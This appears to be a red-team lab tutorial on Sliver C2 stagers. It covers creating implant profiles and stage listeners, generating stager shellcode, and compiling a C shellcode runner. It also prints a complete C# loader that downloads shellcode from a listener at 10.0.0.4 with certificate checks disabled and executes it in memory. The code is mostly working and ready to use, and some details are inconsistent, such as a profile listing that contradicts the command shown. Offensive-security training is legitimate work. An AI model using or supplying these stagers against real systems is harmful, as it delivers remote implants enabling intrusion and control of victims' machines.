# Stagers

When using Sliver during a live engagement, you’re going to need to use custom stagers, which are essentially a first binary or commandline that will retrieve and/or load Sliver into memory on your target system. Sliver can generate shellcode for your stager to execute by using the `profiles` command.

For this exercise we will create a new beacon profile for linux, stage it and use a bash script to download and execute 

```
[server] sliver > profiles new -b **%%LINUX_IPADDRESS%%** --format shellcode --skip-symbols --debug profile1

[*] Saved new implant profile profile1
```

The profile should now be available when listing them using `profiles` command.

```
[server] sliver > profiles

 Profile Name   Implant Type   Platform        Command & Control       Debug   Format       Obfuscation   Limitations 
============== ============== =============== ======================= ======= ============ ============= =============
 profile1       session        windows/amd64   [1] https://10.0.0.4   true    EXECUTABLE   disabled
```

A stage listener linked to the profile can now be created that will host your executable.

```
[server] sliver > stage-listener --url http://**%%LINUX_IPADDRESS%%**:7200 --profile profile1

[*] No builds found for profile profile1, generating a new one
[*] Job 1 (http) started
```

Once thats done the stage listener will host the second stage payload on the URL when specifying a file with extension `.woff` . For example, by reaching out to: [http://localhost:7200/test.woff](http://localhost:7200/test.woff) you will see that it downloads the second stage payload.

## Metasploit

You can generate msfvenom shellcode to connect back to our stage listener and retrieve the second stage payload, however you’ll need to include the `--prepend-size` argument to the stage listener as Metasploit payloads require the length to be prepended to the stage. You can either kill the previous stage listener using the `jobs -k` command or run the stage listener on a different port:

```html
[server] sliver > stage-listener --url http://**%%LINUX_IPADDRESS%%**:7202 --profile profile1 --prepend-size

[*] Sliver name for profile: IDEAL_THRONE
[*] Job 2 (http) started
```

Once you have the stage listener setup with prepend size, you can generate the stager shellcode:

```bash
[server] sliver > generate stager --lhost **%%LINUX_IPADDRESS%%** --lport 7202 --protocol http --save /tmp --format c

[*] Sliver implant stager saved to: /tmp/HOLLOW_CHINO
```

Create a new file on the Linux box with the following contents and replace the `%%STAGE_SHELLCODE%%` field with the shellcode previously created:

```bash
#include "windows.h"

int main()
{
        unsigned char buf[] = **%%STAGE_SHELLCODE%%** ;
    void *exec = VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, sizeof buf);
    ((void(*)())exec)();

    return 0;
}
```

Finally compile the payload.

```bash
x86_64-w64-mingw32-gcc -o stage.exe stager.c
```

Once the executable is copied over to a windows host and run you should see a session connect back to your host.

## Custom stager

You can also use a custom stager that just retrieves sliver shellcode directly and loads it in memory similarly to the previous stager.

```bash
using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace ConsoleApp1
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(
           IntPtr lpAddress,
           uint dwSize,
           AllocationType flAllocationType,
           MemoryProtection flProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(
            IntPtr lpAddress,
            uint dwSize,
            MemoryProtection flNewProtect,
            out MemoryProtection lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

    static async Task Main(string[] args)
        {

            byte[] shellcode;

            using (var handler = new HttpClientHandler())
            {
                // ignore ssl, because self-signed
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    // Download the shellcode
                    shellcode = await client.GetByteArrayAsync("http://10.0.0.4:7200/whatever.woff");
                }
            }

            // Allocate a region of memory in this process as RW
            var baseAddress = VirtualAlloc(
                IntPtr.Zero,
                (uint)shellcode.Length,
                AllocationType.Commit | AllocationType.Reserve,
                MemoryProtection.ReadWrite);

            // Copy the shellcode into the memory region
            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            // Change memory region to RX
            VirtualProtect(
                baseAddress,
                (uint)shellcode.Length,
                MemoryProtection.ExecuteRead,
                out _);

            // Execute shellcode
            var hThread = CreateThread(
                IntPtr.Zero,
                0,
                baseAddress,
                IntPtr.Zero,
                0,
                out _);
            // Wait infinitely on this thread to stop the process exiting
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

## References

- [https://github.com/BishopFox/sliver/wiki/Stagers](https://github.com/BishopFox/sliver/wiki/Stagers)
